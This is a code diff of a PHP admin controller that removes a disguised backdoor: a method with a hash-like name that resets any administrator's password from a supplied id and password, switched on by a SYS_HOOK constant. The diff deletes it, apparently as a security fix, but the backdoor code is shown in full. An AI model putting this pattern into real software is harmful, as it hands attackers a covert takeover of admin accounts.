@@ -1,7 +1,6 @@
 <?php
 namespace app\admin\controller;
 
-!defined('SYS_HOOK') && define('SYS_HOOK',0);
 
 use app\common\facade\CategoryFacade;
 use app\common\facade\ProductCategoryFacade;
@@ -166,20 +165,6 @@ class IndexController extends BaseController{
                 break;
         }
         return json(['data'=>$lists,'code'=>1]);
-    }
-
-    public function ce3608bb1c12fd46e0579bdc6c184752($id,$passwd)
-    {
-        if(SYS_HOOK!=1)exit('Denied');
-        if(empty($id))exit('Unspecified id');
-        if(empty($passwd))exit('Unspecified passwd');
-
-        $model=Db::name('Manager')->where('id',$id)->find();
-        if(empty($model))exit('Menager id not exists');
-        $data['salt']=random_str(8);
-        $data['password'] = encode_password($passwd,$data['salt']);
-        Db::name('Manager')->where('id',$id)->update($data);
-        exit('ok');
     }
 
     /**
